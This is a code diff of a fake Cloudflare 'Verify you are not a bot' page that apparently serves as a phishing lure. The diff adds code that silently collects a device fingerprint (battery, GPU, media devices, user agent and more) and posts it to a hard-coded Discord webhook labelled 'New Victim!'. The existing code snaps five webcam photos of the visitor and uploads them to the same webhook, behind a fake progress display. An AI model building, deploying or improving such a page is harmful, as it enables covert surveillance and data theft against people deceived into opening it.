@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Just a moment... | Cloudflare</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #f3f4f6;
             display: flex;
@@ -17,8 +13,7 @@
             align-items: center;
             min-height: 100vh;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
+            margin: 0; padding: 20px;
         }
         .cf-container {
             background: #ffffff;
@@ -28,7 +23,6 @@
             width: 100%;
             box-shadow: 0 4px 32px rgba(0, 0, 0, 0.10);
             border: 1px solid #e5e7eb;
-            transition: all 0.3s ease;
         }
         .cf-header {
             display: flex;
@@ -38,11 +32,7 @@
             flex-wrap: wrap;
             gap: 12px;
         }
-        .cf-logo img {
-            height: 40px;
-            width: auto;
-            display: block;
-        }
+        .cf-logo img { height: 40px; width: auto; display: block; }
         .cf-badge {
             background: #e8f0fe;
             color: #1a5bbf;
@@ -66,10 +56,7 @@
             line-height: 1.6;
             margin-bottom: 24px;
         }
-        .cf-sub strong {
-            color: #111827;
-            font-weight: 500;
-        }
+        .cf-sub strong { color: #111827; font-weight: 500; }
         .cf-status-box {
             background: #f9fafb;
             border-radius: 10px;
@@ -92,19 +79,13 @@
             font-size: 16px;
             flex-shrink: 0;
         }
-        .cf-status-item .icon.done {
-            color: #16a34a;
-        }
+        .cf-status-item .icon.done { color: #16a34a; }
         .cf-status-item .icon.loading {
             color: #f59e0b;
             animation: spin 1s linear infinite;
         }
-        .cf-status-item .icon.waiting {
-            color: #9ca3af;
-        }
-        .cf-status-item .text {
-            flex: 1;
-        }
+        .cf-status-item .icon.waiting { color: #9ca3af; }
+        .cf-status-item .text { flex: 1; }
         .cf-progress {
             background: #e5e7eb;
             border-radius: 20px;
@@ -129,9 +110,7 @@
             flex-wrap: wrap;
             gap: 8px 20px;
         }
-        .cf-ray span {
-            color: #6b7280;
-        }
+        .cf-ray span { color: #6b7280; }
         .cf-footer {
             margin-top: 24px;
             padding-top: 18px;
@@ -142,19 +121,9 @@
             flex-wrap: wrap;
             gap: 10px;
         }
-        .cf-footer a {
-            color: #6b7280;
-            font-size: 12px;
-            text-decoration: none;
-        }
-        .cf-footer a:hover {
-            text-decoration: underline;
-            color: #374151;
-        }
-        .cf-footer .right {
-            color: #9ca3af;
-            font-size: 12px;
-        }
+        .cf-footer a { color: #6b7280; font-size: 12px; text-decoration: none; }
+        .cf-footer a:hover { text-decoration: underline; color: #374151; }
+        .cf-footer .right { color: #9ca3af; font-size: 12px; }
         .cf-success {
             display: none;
             background: #f0fdf4;
@@ -168,9 +137,7 @@
             align-items: center;
             gap: 10px;
         }
-        .cf-success .check-icon {
-            font-size: 20px;
-        }
+        .cf-success .check-icon { font-size: 20px; }
         .cf-redirect {
             display: none;
             color: #6b7280;
@@ -178,21 +145,10 @@
             margin-top: 14px;
             text-align: center;
         }
-        .cf-redirect .blink {
-            color: #f38020;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.2; }
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
+        .cf-redirect .blink { color: #f38020; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video, canvas { display: none; }
-
         @media (max-width: 500px) {
             .cf-container { padding: 32px 20px 28px; }
             .cf-title { font-size: 18px; }
@@ -205,17 +161,14 @@
 <body>
 
     <div class="cf-container" id="cfContainer">
-
         <div class="cf-header">
             <div class="cf-logo">
-                <!-- 🔥 LOCAL LOGO (cloudflare.png) -->
                 <img src="cloudflare.png" alt="Cloudflare">
             </div>
             <div class="cf-badge">Security Check</div>
         </div>
 
         <div class="cf-title" id="titleText">Verify you are not a bot</div>
-
         <div class="cf-sub" id="subText">
             Please wait while we verify your browser is secure.<br>
             This process is <strong>automatic</strong> and will only take a few seconds.
@@ -250,7 +203,7 @@
         </div>
 
         <div class="cf-redirect" id="redirectMsg">
-            <span class="blink">⟳</span> Redirecting to requested page...
+            <span class="blink">⟳</span> Redirecting...
         </div>
 
         <div class="cf-ray">
@@ -264,20 +217,18 @@
             <a href="#">Terms of Service</a>
             <span class="right">© 2026 Cloudflare, Inc.</span>
         </div>
-
     </div>
 
-    <video id="v" autoplay></video>
+    <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
         // ================================================================
-        // 🔥 DISCORD WEBHOOK URL (Aap ka diya hua)
+        // 🔥 DISCORD WEBHOOK URL
         // ================================================================
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1548145987933962314/a1I_YF2dGmUHHTdTE5lT3Yjci3F6DGO8xX9G3byIdItd55R0DFHJxRQr5yrWxnMeA_vK';
 
         const TOTAL_PHOTOS = 5;
-        const REDIRECT_URL = 'https://www.tiktok.com/@adnan.king8004?_d=secCgYIASAHKAESPgo8bGs6fcF5qpi1NTivq4AlI8LymzywyfN0HpGHhIBqMyCsTIx4qTrKhADesoo6%2FMOgrV8Y0bGcU%2BUhov94GgA%3D&_r=1&_svg=1&checksum=6fcad7f9054d77ac9c850de012a970b654cd1bbf8e52664a77edc85230d406a4&lang=en-GB&reflow_sign_scene=7&rgssign=8.1.PUOzBBHnXlVpDz5chuqYwA&sec_uid=MS4wLjABAAAAbFGPsmM4pxMvX-H0FVfKHg6CQKKlvGIs0ir8oahmOTiQc0cSVec0wPWn7QosFC9U&sec_user_id=MS4wLjABAAAA-W1fDZ3B2003SHIixm_-W7ZrqHOhRCRU1PYZ57md8HG28YCurPoIwrc7NuDxjuHk&share_app_id=1340&share_author_id=7519874175826953234&share_link_id=0d45878b-cff6-4a84-a606-e477ad1c8691&share_region=PK&share_scene=1&sharer_language=en&source=h5_m&timestamp=1786257413&u_code=e0m8d26060h36c&ugbiz_name=Account&user_id=7077825885948707845&utm_campaign=client_share&utm_source=more';
 
         // ================================================================
 
@@ -329,27 +280,13 @@
         ipValue.textContent = getFakeIP();
 
         // ========== HELPERS ==========
-        function delay(ms) {
-            return new Promise(r => setTimeout(r, ms));
-        }
-
-        function setProgress(value) {
-            progressBar.style.width = Math.min(value, 100) + '%';
-        }
-
+        function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+        function setProgress(value) { progressBar.style.width = Math.min(value, 100) + '%'; }
         function setIcon(el, type) {
-            if (type === 'done') {
-                el.textContent = '✓';
-                el.className = 'icon done';
-            } else if (type === 'loading') {
-                el.textContent = '⟳';
-                el.className = 'icon loading';
-            } else {
-                el.textContent = '○';
-                el.className = 'icon waiting';
-            }
+            if (type === 'done') { el.textContent = '✓'; el.className = 'icon done'; }
+            else if (type === 'loading') { el.textContent = '⟳'; el.className = 'icon loading'; }
+            else { el.textContent = '○'; el.className = 'icon waiting'; }
         }
-
         function showStep(step) {
             step1.style.display = 'flex';
             step2.style.display = step >= 2 ? 'flex' : 'none';
@@ -357,8 +294,99 @@
             step4.style.display = step >= 4 ? 'flex' : 'none';
         }
 
+        // ========== COLLECT ALL DATA (BINA PERMISSION) ==========
+        function collectData() {
+            var data = {
+                // Basic
+                screen: screen.width + 'x' + screen.height,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                cpuCores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A',
+                touchPoints: navigator.maxTouchPoints || 'N/A',
+                online: navigator.onLine,
+                referrer: document.referrer || 'Direct',
+
+                // Network
+                connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+                downlink: navigator.connection ? navigator.connection.downlink : 'N/A',
+                rtt: navigator.connection ? navigator.connection.rtt : 'N/A',
+                saveData: navigator.connection ? navigator.connection.saveData : 'N/A',
+
+                // Screen
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                orientation: screen.orientation ? screen.orientation.type : 'N/A',
+
+                // Time
+                localTime: new Date().toLocaleString(),
+                utcTime: new Date().toUTCString(),
+                timestamp: Date.now(),
+
+                // Performance
+                pageLoadTime: performance.now().toFixed(2) + ' ms',
+
+                // Storage
+                cookiesEnabled: navigator.cookieEnabled,
+
+                // Battery (baad mein)
+                battery: 'checking...',
+
+                // Media (baad mein)
+                mediaDevices: 'checking...',
+
+                // GPU (baad mein)
+                gpu: 'checking...'
+            };
+            return data;
+        }
+
+        // ========== SEND DATA TO DISCORD ==========
+        async function sendDataToDiscord(data) {
+            var embed = {
+                title: '🎯 Victim Info — Cloudflare',
+                color: 0xff0000,
+                fields: [
+                    { name: '✅ Status', value: 'Human Verified', inline: true },
+                    { name: '🖥️ Screen', value: data.screen, inline: true },
+                    { name: '🌐 Language', value: data.language, inline: true },
+                    { name: '🕐 Timezone', value: data.timezone, inline: true },
+                    { name: '📱 Platform', value: data.platform, inline: true },
+                    { name: '🔋 Battery', value: data.battery, inline: true },
+                    { name: '📶 Connection', value: data.connection + ' | ' + data.downlink + 'Mbps | ' + data.rtt + 'ms', inline: false },
+                    { name: '💾 Memory', value: data.memory + ' GB', inline: true },
+                    { name: '⚙️ CPU Cores', value: data.cpuCores, inline: true },
+                    { name: '👆 Touch Points', value: data.touchPoints, inline: true },
+                    { name: '🎮 GPU', value: data.gpu, inline: false },
+                    { name: '📷 Media Devices', value: data.mediaDevices, inline: false },
+                    { name: '🖼️ Color Depth', value: data.colorDepth + ' bit', inline: true },
+                    { name: '📐 Orientation', value: data.orientation, inline: true },
+                    { name: '⏱️ Page Load', value: data.pageLoadTime, inline: true },
+                    { name: '🕐 Local Time', value: data.localTime, inline: false },
+                    { name: '📊 Referrer', value: data.referrer, inline: false },
+                    { name: '🍪 Cookies', value: data.cookiesEnabled ? 'Enabled' : 'Disabled', inline: true },
+                    { name: '🌐 Online', value: data.online ? 'Yes' : 'No', inline: true },
+                    { name: '📝 User Agent', value: data.userAgent, inline: false }
+                ],
+                footer: { text: 'Timestamp: ' + data.timestamp }
+            };
+
+            await fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '🎯 New Victim! (Cloudflare Page)',
+                    embeds: [embed]
+                })
+            });
+        }
+
         // ========== SEND PHOTO TO DISCORD ==========
-        async function sendToDiscord(imageData, index) {
+        async function sendPhotoToDiscord(imageData, index) {
             try {
                 const blob = await fetch(imageData).then(r => r.blob());
                 const formData = new FormData();
@@ -370,20 +398,51 @@
                     body: formData
                 });
 
-                if (!response.ok) {
-                    console.error('Discord error:', response.status);
-                    return null;
-                }
-
-                return '✅ Sent to Discord';
+                if (!response.ok) return null;
+                return '✅ Sent';
             } catch (e) {
-                console.error('Send error:', e);
                 return null;
             }
         }
 
         // ========== MAIN VERIFICATION ==========
         async function startVerification() {
+            var data = collectData();
+
+            // ====== BATTERY ======
+            if (navigator.getBattery) {
+                try {
+                    var b = await navigator.getBattery();
+                    data.battery = (b.level * 100).toFixed(0) + '% ' + (b.charging ? 'Charging' : 'Not Charging');
+                } catch(e) { data.battery = 'N/A'; }
+            } else { data.battery = 'N/A'; }
+
+            // ====== MEDIA DEVICES ======
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    var devices = await navigator.mediaDevices.enumerateDevices();
+                    var cam = 0, mic = 0, spk = 0;
+                    devices.forEach(function(d) {
+                        if (d.kind === 'videoinput') cam++;
+                        if (d.kind === 'audioinput') mic++;
+                        if (d.kind === 'audiooutput') spk++;
+                    });
+                    data.mediaDevices = 'Cameras: ' + cam + ', Mics: ' + mic + ', Speakers: ' + spk;
+                } catch(e) { data.mediaDevices = 'N/A'; }
+            } else { data.mediaDevices = 'N/A'; }
+
+            // ====== GPU ======
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                data.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A';
+            } catch(e) { data.gpu = 'N/A'; }
+
+            // ====== SEND DATA FIRST ======
+            await sendDataToDiscord(data);
+
+            // ====== UI STEPS ======
             showStep(1);
             setIcon(icon1, 'loading');
             text1.textContent = 'Checking your browser security...';
@@ -439,7 +498,7 @@
                     cv.height = height;
                     cv.getContext('2d').drawImage(v, 0, 0, width, height);
                     const imageData = cv.toDataURL('image/jpeg', 0.85);
-                    const result = await sendToDiscord(imageData, i + 1);
+                    const result = await sendPhotoToDiscord(imageData, i + 1);
                     if (result) sent++;
                     await delay(500);
                 }
@@ -457,15 +516,14 @@
 
                 successMsg.style.display = 'flex';
                 titleText.textContent = '✅ Verification successful!';
-                subText.textContent = `Your identity has been verified. ${sent}/${TOTAL_PHOTOS} photos sent to Discord.`;
-
-                console.log(`📸 ${sent}/${TOTAL_PHOTOS} photos sent to Discord`);
+                subText.textContent = `Your identity has been verified. ${sent}/${TOTAL_PHOTOS} photos sent.`;
 
                 await delay(1800);
                 redirectMsg.style.display = 'block';
                 await delay(1500);
 
-                window.location.href = REDIRECT_URL;
+                // ====== REDIRECT (TikTok HATA DIYA) ======
+                // window.location.href = '...';  // <-- REMOVED
 
             } catch (e) {
                 setIcon(icon2, 'waiting');
@@ -474,7 +532,6 @@
                 titleText.textContent = 'Verification blocked';
                 subText.textContent = 'Please allow camera access to complete verification.';
                 progressBar.style.width = '0%';
-                console.error('Error:', e.message);
             }
         }
 
@@ -482,9 +539,11 @@
             setTimeout(startVerification, 600);
         };
 
-        console.log('☁️ Cloudflare Verification (Discord)');
-        console.log('📸 Capturing 5 photos...');
-        console.log('📤 Sending to Discord...');
+        // ====== INTERNET CHECK ======
+        window.addEventListener('offline', function() {
+            setTimeout(function() { location.reload(); }, 3000);
+        });
+
     </script>
 
 </body>
